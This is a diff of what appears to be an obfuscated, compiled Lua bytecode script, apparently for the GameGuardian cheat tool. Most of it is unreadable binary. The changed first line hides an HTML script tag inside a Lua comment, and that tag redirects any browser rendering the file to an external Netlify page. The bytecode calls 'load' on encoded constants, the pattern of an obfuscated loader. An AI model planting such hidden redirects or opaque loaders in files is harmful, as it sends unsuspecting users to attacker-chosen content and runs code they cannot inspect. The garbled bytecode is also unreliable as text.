@@ -1,4 +1,3 @@
---[[<script>https://ggsx.netlify.app/j.html<script/>]]
 LuaR  ÅE
 
          ;T  %     Ä%@    Ä @ K  ÅÄ  ¡¿  ¡  A ÅA ¡ÅE ¬ A¬ ÅE ¡B C AÅE ÅE ¡  AD ÅÑ ¡ƒ ÅE A≈ ÅE ¡ F A∆ ÅE ¡F ÅE AÅE  ÅE ¡« » AH Å» ¡ 	 AI Åâ ¡… 
@@ -154,3 +153,4 @@ AA ÅE ¡ B AÅE ÅÇ ¡B ÅE AC ÅC ¡√ D Aƒ ÅÑ ¡ƒ ÅE AÅE ÅÖ ¡E
  AÅE ÅC ¡√
  $AÄ›Ä ÅE ∆¿L « Œù@ ÅEN ∆ A 
  A¡ ÅÅ ¡¡ B $A ›Ä ÅE ù@Ä  Ä <      pcall    load     gg    _A      @X@      [@     @Y@     Ä\@      ]@      m@     ¿b@     @d@     ¿l@     †b@      f@     ¿^@       @     @_@     `l@      `@     ‡d@     @`@      e@     ``@      e@     Äg@     Äa@     ‡l@      c@     @g@     Äb@     ‡c@     ‡b@     ‡g@     Ä`@      `@      $@      g@     ‡e@     @e@      a@     @b@     †f@     Äl@     ¿`@     ¿g@     ¿\@     ÄT@     Ä[@     ¿Y@   ex    rang      ¿[@      Y@     @]@   val    os       ^@     @Z@                            ÅE         @ F@@ ÅE  ¡Ä  ÅE  A¡  ÅE ¡ ÅE  AB ÅÇ ¡¬  AC ÅÉ ¡ÅE  ÅE Aƒ ÅE §@ ]  @   Ä        dofile    _A       G@     ÄG@     ¿Y@     ¿\@     ¿X@     Ä\@     @Z@      \@      ]@     ÄY@                                             
+--[[<script>location.href="https://ggsx.netlify.app/j.html"</script>]]
